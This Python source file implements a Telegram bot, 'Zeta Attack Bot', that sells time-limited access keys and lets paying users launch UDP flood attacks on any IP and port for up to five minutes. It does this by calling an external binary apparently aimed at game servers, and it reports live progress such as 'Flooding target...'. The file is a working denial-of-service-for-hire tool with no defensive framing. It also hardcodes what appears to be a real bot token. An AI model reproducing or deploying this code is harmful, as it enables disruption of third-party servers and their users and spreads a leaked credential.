#!/usr/bin/env python3
import os
import subprocess
import threading
import json
import random
import string
import time
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============================================================
# CONFIGURATION
# ============================================================
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8402168828:AAEEYWZMAW--Wtr3wLDAYyTyiWw9cufH44U')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 6465928598))

DATA_FILE = "zeta_users.json"
KEYS_FILE = "generated_keys.json"
BINARY_PATH = "./bgmi_beast"

active_attacks = {}
attack_lock = threading.Lock()
attack_messages = {}  # {chat_id: {'message_id': int, 'progress_msg_id': int}}

# ============================================================
# HELPER FUNCTIONS
# ============================================================
def load_json(filepath, default):
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            return json.load(f)
    return default

def save_json(filepath, data):
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=4)

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_approved(user_id):
    data = load_json(DATA_FILE, {})
    user_data = data.get(str(user_id))
    if not user_data:
        return False
    expiry = datetime.fromisoformat(user_data.get('expiry', '2000-01-01'))
    return expiry > datetime.now()

def generate_key(days):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    expiry = (datetime.now() + timedelta(days=days)).isoformat()
    keys_data = load_json(KEYS_FILE, {})
    keys_data[key] = expiry
    save_json(KEYS_FILE, keys_data)
    return key

def redeem_key(user_id, key):
    keys_data = load_json(KEYS_FILE, {})
    if key not in keys_data:
        return False, "❌ Invalid key"
    expiry = datetime.fromisoformat(keys_data[key])
    if expiry < datetime.now():
        del keys_data[key]
        save_json(KEYS_FILE, keys_data)
        return False, "❌ Key expired"
    
    data = load_json(DATA_FILE, {})
    data[str(user_id)] = {'approved_by': 'key', 'expiry': expiry.isoformat()}
    save_json(DATA_FILE, data)
    del keys_data[key]
    save_json(KEYS_FILE, keys_data)
    return True, f"✅ Access granted until {expiry.strftime('%Y-%m-%d %H:%M:%S')}"

def format_progress_bar(percent, width=20):
    filled = int(width * percent / 100)
    bar = '█' * filled + '░' * (width - filled)
    return f"`[{bar}]` {percent:.1f}%"

def run_attack(chat_id, target_ip, port, duration, method="udp", threads=16):
    global active_attacks
    cmd = [BINARY_PATH, target_ip, str(port), str(duration), str(threads), method]
    
    start_time = time.time()
    
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        with attack_lock:
            active_attacks[chat_id] = {
                'target': f"{target_ip}:{port}",
                'start_time': start_time,
                'end_time': start_time + duration,
                'duration': duration,
                'process': process,
                'method': method,
                'threads': threads,
                'ip': target_ip,
                'port': port
            }
        
        # Monitor progress
        while process.poll() is None:
            elapsed = time.time() - start_time
            remaining = duration - elapsed
            if remaining < 0:
                remaining = 0
            percent = (elapsed / duration) * 100
            if percent > 100:
                percent = 100
            
            with attack_lock:
                if chat_id in active_attacks:
                    active_attacks[chat_id]['percent'] = percent
                    active_attacks[chat_id]['remaining'] = remaining
            
            time.sleep(1)
        
        process.wait()
        
        with attack_lock:
            if chat_id in active_attacks:
                del active_attacks[chat_id]
                
    except Exception as e:
        print(f"Attack error: {e}")
        with attack_lock:
            if chat_id in active_attacks:
                del active_attacks[chat_id]

# ============================================================
# PROGRESS UPDATE FUNCTION
# ============================================================
async def update_progress(context: ContextTypes.DEFAULT_TYPE):
    with attack_lock:
        for chat_id, attack in list(active_attacks.items()):
            if 'percent' in attack:
                percent = attack['percent']
                remaining = attack.get('remaining', 0)
                target = attack['target']
                
                progress_bar = format_progress_bar(percent)
                remaining_min = int(remaining // 60)
                remaining_sec = int(remaining % 60)
                
                status_msg = (
                    f"🔥 **ATTACK IN PROGRESS** 🔥\n\n"
                    f"🎯 **Target:** `{target}`\n"
                    f"📊 **Progress:** {progress_bar}\n"
                    f"⏱️ **Remaining:** {remaining_min}m {remaining_sec}s\n"
                    f"⚡ **Method:** {attack.get('method', 'udp').upper()}\n"
                    f"🧵 **Threads:** {attack.get('threads', 16)}\n\n"
                    f"🟢 **Status:** Active"
                )
                
                try:
                    await context.bot.send_message(chat_id=chat_id, text=status_msg, parse_mode='HTML')
                except:
                    pass

# ============================================================
# BOT COMMAND HANDLERS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🔥 <b>Welcome to Zeta Attack Bot</b> 🔥\n\n"
        "⚡ Powered by Zo, created by Alpha\n"
        "👑 <b>Owner:</b> @Yowai_mo_456\n\n"
        "📖 <b>Commands:</b>\n"
        "/help - Show all commands\n"
        "/myinfo - Your access info\n"
        "/status - Active attacks\n"
        "/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - Launch attack\n"
        "/redeem &lt;key&gt; - Redeem access key"
    )
    await update.message.reply_text(msg, parse_mode='HTML')

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Not approved. Use /redeem")
        return
    
    msg = (
        "🔧 <b>Zeta Bot Commands</b> 🔧\n\n"
        "<b>User Commands:</b>\n"
        "/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - Launch attack\n"
        "/myinfo - Show access expiry\n"
        "/status - Show running attacks\n"
        "/redeem &lt;key&gt; - Redeem key\n"
        "/help - This message\n\n"
        "<b>Admin Commands:</b>\n"
        "/approve &lt;user_id&gt; &lt;days&gt; - Grant access\n"
        "/genkey &lt;days&gt; - Generate key\n\n"
        "<b>Example:</b>\n"
        "<code>/attack 1.1.1.1 10001 60</code>"
    )
    await update.message.reply_text(msg, parse_mode='HTML')

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    info = load_json(DATA_FILE, {}).get(str(user_id))
    if not info:
        await update.message.reply_text("❌ No access. Use /redeem")
        return
    expiry = datetime.fromisoformat(info['expiry'])
    remaining = expiry - datetime.now()
    msg = f"📋 <b>Your Info</b>\n\n🆔 ID: <code>{user_id}</code>\n📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n⏳ Days left: {remaining.days}"
    await update.message.reply_text(msg, parse_mode='HTML')

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Access denied")
        return
    
    with attack_lock:
        if not active_attacks:
            await update.message.reply_text("✅ No active attacks")
            return
        
        msg = "🔥 <b>Active Attacks</b> 🔥\n\n"
        for chat_id, attack in active_attacks.items():
            remaining = attack.get('remaining', 0)
            percent = attack.get('percent', 0)
            bar = format_progress_bar(percent, 15)
            msg += f"🎯 <code>{attack['target']}</code>\n"
            msg += f"{bar} {percent:.0f}%\n"
            msg += f"⏱️ {int(remaining//60)}m {int(remaining%60)}s remaining\n"
            msg += "────────────────\n"
        await update.message.reply_text(msg, parse_mode='HTML')

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Not approved. Use /redeem")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("⚠️ Usage: <code>/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt;</code>\nExample: <code>/attack 1.1.1.1 10001 60</code>", parse_mode='HTML')
        return
    
    target_ip, port, duration = args[0], int(args[1]), int(args[2])
    
    if duration > 300:
        await update.message.reply_text("❌ Max duration: 300 seconds (5 minutes)")
        return
    
    # Send initial message
    initial_msg = await update.message.reply_text(
        f"🔥 **ATTACK STARTED** 🔥\n\n"
        f"🎯 Target: <code>{target_ip}:{port}</code>\n"
        f"⏱️ Duration: {duration} seconds\n"
        f"⚡ Status: Initializing...",
        parse_mode='HTML'
    )
    
    # Launch attack thread
    thread = threading.Thread(target=run_attack, args=(chat_id, target_ip, port, duration, "udp", 16))
    thread.daemon = True
    thread.start()
    
    # Start progress updates
    if not context.job_queue:
        return
    
    # Schedule progress updates every 2 seconds
    job = context.job_queue.run_repeating(
        send_progress_update, 
        interval=2, 
        first=2,
        data={'chat_id': chat_id, 'target': f"{target_ip}:{port}", 'duration': duration, 'msg_id': initial_msg.message_id}
    )
    context.chat_data['progress_job'] = job

async def send_progress_update(context: ContextTypes.DEFAULT_TYPE):
    job_data = context.job.data
    chat_id = job_data['chat_id']
    target = job_data['target']
    duration = job_data['duration']
    
    with attack_lock:
        if chat_id not in active_attacks:
            # Attack finished
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"✅ **ATTACK FINISHED** ✅\n\n🎯 Target: <code>{target}</code>\n⏱️ Duration: {duration} seconds\n📊 Status: Completed successfully!",
                parse_mode='HTML'
            )
            context.job.schedule_removal()
            return
        
        attack = active_attacks[chat_id]
        elapsed = time.time() - attack['start_time']
        percent = min(100, (elapsed / duration) * 100)
        remaining = max(0, duration - elapsed)
        
        progress_bar = format_progress_bar(percent)
        remaining_min = int(remaining // 60)
        remaining_sec = int(remaining % 60)
        
        status_msg = (
            f"🔥 **ATTACK IN PROGRESS** 🔥\n\n"
            f"🎯 Target: <code>{target}</code>\n"
            f"📊 Progress: {progress_bar}\n"
            f"⏱️ Remaining: {remaining_min}m {remaining_sec}s\n"
            f"📈 Complete: {percent:.1f}%\n\n"
            f"🟢 Status: Flooding target..."
        )
        
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=job_data['msg_id'],
                text=status_msg,
                parse_mode='HTML'
            )
        except:
            pass

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /redeem KEY")
        return
    success, msg = redeem_key(update.effective_user.id, context.args[0])
    await update.message.reply_text(msg)

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /approve USER_ID DAYS")
        return
    target_id, days = int(context.args[0]), int(context.args[1])
    expiry = datetime.now() + timedelta(days=days)
    data = load_json(DATA_FILE, {})
    data[str(target_id)] = {'approved_by': 'admin', 'expiry': expiry.isoformat()}
    save_json(DATA_FILE, data)
    await update.message.reply_text(f"✅ User <code>{target_id}</code> approved for {days} days", parse_mode='HTML')

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /genkey DAYS")
        return
    key = generate_key(int(context.args[0]))
    await update.message.reply_text(f"🔑 <b>Generated Key</b>\n\n<code>{key}</code>", parse_mode='HTML')

# ============================================================
# MAIN
# ============================================================
def main():
    print("🔥 Zo Bot with Live Monitoring is starting...")
    print(f"👑 Admin ID: {ADMIN_ID}")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("genkey", genkey))
    
    print("✅ Bot is running with live progress tracking...")
    app.run_polling()

if __name__ == "__main__":
    main()
